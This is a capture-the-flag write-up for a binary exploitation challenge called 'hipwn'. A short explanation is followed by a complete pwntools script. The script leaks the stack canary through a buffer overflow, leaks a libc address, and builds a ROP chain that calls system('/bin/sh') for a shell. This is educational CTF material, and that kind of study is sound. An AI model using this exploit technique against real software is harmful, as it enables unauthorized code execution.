# hipwn

This challenge is relatively simple, there's a while loop which takes user input and the size of the input is not checked resulting in a buffer overflow. Canary and PIE is enabled but we can simply overwrite the null byte of the canary and then leak it out. We can do the same to get an address leak from the stack and calculate libc base. Then we can overwrite the return address with a rop chain and get a shell.

```python
from pwn import *
context.arch = "amd64"

io = process("./stuff/chall")
# io = remote("45.153.243.57", 1337)
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

if args.GDB:
    gdb.attach(io)

payload = b"A"*73
io.sendlineafter(b"How much???", b"200")
io.sendafter(b"content", payload)
io.recvuntil(b"A"*73)

canary = u64(b"\0" + io.recv(7))
info(f"canary is: {hex(canary)}")

io.sendlineafter(b"again?", b"1337")
io.sendlineafter(b"How much???", b"200")
payload = b"A"*72 + b"A"*16
io.sendafter(b"content", payload)
io.recvuntil(b"A"*88)

libc_addr = unpack(io.recv(6), 'all')
info(f"libc address: {hex(libc_addr)}")
libc.address = libc_addr - 0x29d90

io.sendlineafter(b"again?", b"1337")
io.sendlineafter(b"How much???", b"200")

rop = ROP(libc)
payload = b"A"*72
payload += p64(canary)
payload += b"A"*8
payload += p64(rop.find_gadget(['pop rdi', 'ret'])[0])
payload += p64(next(libc.search(b"/bin/sh\0")))
payload += p64(rop.find_gadget(['pop rsi', 'ret'])[0])
payload += p64(0)
payload += p64(rop.find_gadget(['ret'])[0])
payload += p64(libc.sym["system"])

io.sendafter(b"content", payload)
io.sendline(b"123")

io.interactive()
```